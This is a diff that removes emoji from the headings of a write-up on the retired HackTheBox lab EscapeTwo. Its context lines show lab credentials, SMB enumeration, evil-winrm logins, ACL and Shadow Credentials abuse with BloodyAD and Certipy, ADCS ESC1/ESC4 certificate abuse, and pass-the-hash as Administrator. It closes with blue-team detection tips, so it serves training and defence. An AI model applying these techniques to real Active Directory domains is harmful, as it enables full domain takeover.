@@ -24,7 +24,7 @@ Based on the retired [HTB EscapeTwo](https://app.hackthebox.com/machines/EscapeT
 | Lateral Movement | OwnerEdit + DACL + ShadowCreds | Took over `ca_svc`               |
 | Full Compromise  | ADCS abuse → cert + PFX login  | WinRM as Administrator           |
 
-## 🔐 Initial Credentials
+## Initial Credentials
 
 ```bash
 Username: rose
@@ -35,7 +35,7 @@ Password: KxEPkKe6R8su
 echo -e "rose\nKxEPkKe6R8su" > creds.txt
 ```
 
-## 🔍 Network Scanning
+## Network Scanning
 
 ```bash
 sudo nmap -p- --min-rate 10000 -sCV -Pn -oN enum.nmap 10.10.11.51
@@ -165,7 +165,7 @@ Result:
 SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su
 ```
 
-## 📁 SMB Share Enumeration & File retrieval
+## SMB Share Enumeration & File retrieval
 
 ```bash
 
@@ -203,7 +203,7 @@ drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 ..
 
 Discovered: `accounts.xlsx`
 
-## 📊 Parse Excel File
+## Parse Excel File
 
 ```bash
 
@@ -429,7 +429,7 @@ nxc winrm sequel.htb -u ryan -p WqSZAF6CysDQbGb3
 
 WINRM [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
 
-✅ Success! The user ryan is a member of the Remote Management Users group, allowing me to get a shell via evil-winrm and retrieve the first flag:
+Success! The user ryan is a member of the Remote Management Users group, allowing me to get a shell via evil-winrm and retrieve the first flag:
 
 evil-winrm -i dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
 
@@ -465,7 +465,7 @@ This permission enables a user to change the ownership of the targeted object �
 
 ```
 
-## 🔓 Takeover ca\_svc via ACL Abuse
+## Takeover ca\_svc via ACL Abuse
 
 To escalate privileges further, I used BloodyAD to assign full control (GenericAll) over the `ca_svc` account to my controlled user `ryan`. This allowed me to perform a Shadow Credentials attack using Certipy.
 
@@ -499,7 +499,7 @@ This provided stable authentication, confirming that `ca_svc` was fully compromi
 
 ---
 
-## 🏛️ ADCS Abuse (ESC1 / ESC4)
+## ADCS Abuse (ESC1 / ESC4)
 
 Using `certipy`, I began enumerating certificate templates:
 
@@ -556,7 +556,7 @@ Full domain compromise achieved.
 
 ---
 
-## 🪟 Admin Shell (WinRM)
+## Admin Shell (WinRM)
 
 ```bash
 netexec winrm sequel.htb -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
@@ -570,7 +570,7 @@ PS C:\Users\Administrator> type desktop\root.txt
 
 ---
 
-## 🔚 Conclusion
+## Conclusion
 
 This engagement demonstrated how ACL abuse, Shadow Credentials, and ADCS misconfigurations can be chained for full domain compromise.
 
@@ -578,19 +578,19 @@ This engagement demonstrated how ACL abuse, Shadow Credentials, and ADCS misconf
 * Shadow Credentials offered a stealthy path without touching password hashes directly
 * Certipy and BloodHound were instrumental in mapping and exploiting these paths
 
-💡 Blue teams should regularly audit ADCS templates and remove excessive rights from groups like Cert Publishers.
+Blue teams should regularly audit ADCS templates and remove excessive rights from groups like Cert Publishers.
 
 ---
 
 
-## 🔍 Blue Team Detection Tips
+## Blue Team Detection Tips
 
 - Alert on `xp_cmdshell` usage or configuration
 - Monitor certificate enrollments for abnormal usage
 - Audit owner/DACL modifications to sensitive objects
 - Harden and audit ADCS templates regularly (ESC1–ESC8)
 
-## ✅ Summary
+## Summary
 
 | Phase             | Tactic                                 |
 | ----------------- | --------------------------------------- |
